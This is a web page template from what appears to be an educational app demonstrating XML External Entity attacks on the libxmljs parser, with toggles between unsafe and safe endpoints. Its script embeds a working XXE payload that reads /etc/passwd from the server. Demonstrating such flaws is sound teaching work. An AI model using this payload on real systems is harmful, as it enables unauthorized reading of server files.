<% include ../../../views/partials/header %>

<h1 class="page-header">XML External Entity Processing</h1>
<div class="row">
  <div class="col-sm-10 col-sm-8" style="padding-bottom: 30px;">

    <h4>Exploitation of <code>libxmljs</code> module</h4>

    <form method="POST" action="/xxe/unsafe">
      <p>
	The following XML snippet is crafted to exploit SAX parsers that
	are configured to allow for external entity processing. If successful,
	the exploit will instruct the parser to read the <code>/etc/passwd</code>
	file from the server's file system.
      </p>

      <pre id="attack-xml"><%=ATTACK_XML%>></pre>

      <br/>
      <br/>

      <button type="submit" class="btn btn-default">Submit</button>
    </form>
  </div>
</div>

<% include ../../../views/partials/footer %>

<style type="text/css">
 #attack-xml {
   font-family: monospace;
   height: 15em;
   margin: 1em 0;
   resize: none;
   width: 100%;
 }
 button.is-safe.left, button.is-safe.right {
	 line-height : 12pt;
 }
 button.is-safe.left {
	 border-top-right-radius : 0;
	 border-bottom-right-radius : 0;
	 border-right: none;
	 padding-right : .7em;
	 margin-right: 0;
 }
 button.is-safe.right {
	 border-top-left-radius : 0;
	 border-bottom-left-radius : 0;
	 border-left: none;
	 padding-left : .7em;
	 margin-left: 0;
 }
 button.is-safe.active {
	 color: #333;
	 background-color: #e6e6e6;
	 border-color: #adadad;
 }
</style>

<script type="text/javascript">
 const attackXML = `
      <!DOCTYPE read-fs [<!ELEMENT read-fs ANY >
      <!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
      <users>
	<user>
	  <read-fs>&passwd;</read-fs>
	  <name>C.K Frode</name>
	</user>
      </users>`;

 $(() => {
   $('#attack-xml')
     .val(attackXML)
     .after(
       $('<button>')
	 .text('Unsafe')
	 .attr('type', 'button')
	 .addClass('is-safe left btn btn-default active')
	 .on('click', ( e ) => {
	   const elem = $(e.target);
	   const form = elem.closest('form');

	   elem.addClass('active');
	   elem.siblings('.is-safe').removeClass('active');
	   form.attr('action', '/xxe/unsafe');
	 }),
       $('<button>')
	 .text('Safe')
	 .attr('type', 'button')
	 .addClass('is-safe right btn btn-default')
	 .on('click', ( e ) => {
	   const elem = $(e.target);
	   const form = elem.closest('form');

	   elem.addClass('active');
	   elem.siblings('.is-safe').removeClass('active');
	   form.attr('action', '/xxe/safe');
	 }));
 });
</script>
